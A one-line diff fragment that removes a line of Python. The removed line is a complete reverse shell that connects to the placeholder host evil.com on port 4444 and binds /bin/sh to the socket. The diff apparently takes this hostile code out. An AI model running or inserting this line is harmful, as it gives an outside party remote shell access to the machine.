@@ -1,1 +1,0 @@
-import socket,subprocess; s=socket.socket(); s.connect(('evil.com',4444)); subprocess.call(['/bin/sh'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
